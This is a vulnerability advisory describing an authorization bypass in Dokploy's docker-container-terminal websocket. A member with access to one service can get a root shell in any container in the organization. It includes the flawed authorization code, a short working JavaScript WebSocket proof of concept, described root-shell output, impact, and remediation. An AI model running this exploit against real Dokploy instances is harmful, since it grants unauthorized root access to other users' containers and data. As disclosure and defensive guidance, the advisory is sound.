repo.description:
### Summary

The fix for CVE-2026-72864 (GHSA-899j-cjwp-v4gw, v0.29.13) added a `serviceId` authorization path to `/docker-container-terminal`: when `serviceId` is present, the endpoint checks read access on that service and returns true. It never correlates the target `containerId` with the granted service. A member holding read access to a single service opens an interactive root shell (`docker exec -it ... sh`) in any container of the organization, including database containers of services they cannot access.

### Details

`apps/dokploy/server/wss/authorize.ts:39-46`:

```ts
if (serviceId) {
    try {
        await checkServiceAccess(ctx, serviceId, "read");
        return true;   // no check binds containerId to the granted service
    } catch { return false; }
}
```

`apps/dokploy/server/wss/docker-container-terminal.ts:33-36`: `containerId` and `serviceId` are independent query-string parameters. The remaining org check applies to `serverId` only (lines 70-75); the attacker stays in the same org anyway. `containerId`/`shell` pass charset validation (blocks injection, the CVE-2026-24841 class) but nothing validates **ownership**.

Same gap in `docker-container-logs.ts` (logs of any container) and `docker-stats.ts`.

### PoC

Verified on a live v0.30.0 instance. Attacker: member with accessedServices = [one nginx compose service]; no access to the victim database service.

```js
const ws = new WebSocket(
  `wss://<host>/docker-container-terminal?containerId=<victim postgres containerId>&activeWay=sh&serviceId=<granted gate serviceId>`
);
ws.binaryType = "arraybuffer";
ws.onopen = () => setTimeout(() => ws.send('whoami; hostname\n'), 2000);
ws.onmessage = (e) => console.log(typeof e.data === "string" ? e.data : new TextDecoder().decode(e.data));
```

(The 2-second delay waits for the PTY to attach; input sent too early is dropped.)

Output received by the attacker:

![terminal exploit output](https://storage.googleapis.com/dokploy-poc-evidence/dokploy-0.30.0/image.png)

`whoami` returns **root** and the hostname matches the victim container ID - an interactive root shell inside the database container of an unauthorized service. The current user has no permission on the victim container yet executes commands in it.

UI context - the attacker's granted service and its legitimate terminal dialog:

![attacker gate containers](https://storage.googleapis.com/dokploy-poc-evidence/dokploy-0.30.0/vuln07-01-attacker-gate-containers-context.jpeg)

### Impact

In a multi-member org, any member with read access to one service gets root shells on every container in the org: other projects' databases, internal apps. Read/modify data, plant backdoors, harvest DB credentials; restart policies make access persistent. Does not cross organizations (serverId org check holds) - the blast radius is the org's whole container estate. This is the same member-to-root-in-arbitrary-containers class accepted as Critical 9.9 for CVE-2026-72864; the fix closed the unauthenticated local branch but the serviceId path still bypasses scoping.

### Affected versions

v0.29.13 through v0.30.0 (introduced by the CVE-2026-72864 fix).

### Remediation

When serviceId is present, resolve the target container to its owning service (match `com.docker.compose.project` / swarm service name against the serviceId's appName) and reject mismatches. Or drop the serviceId path entirely and require docker:read plus getAccessibleServerIds for every terminal connection. Apply the same to docker-container-logs and docker-stats.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8 High; S:C in multi-tenant) - CWE-862.
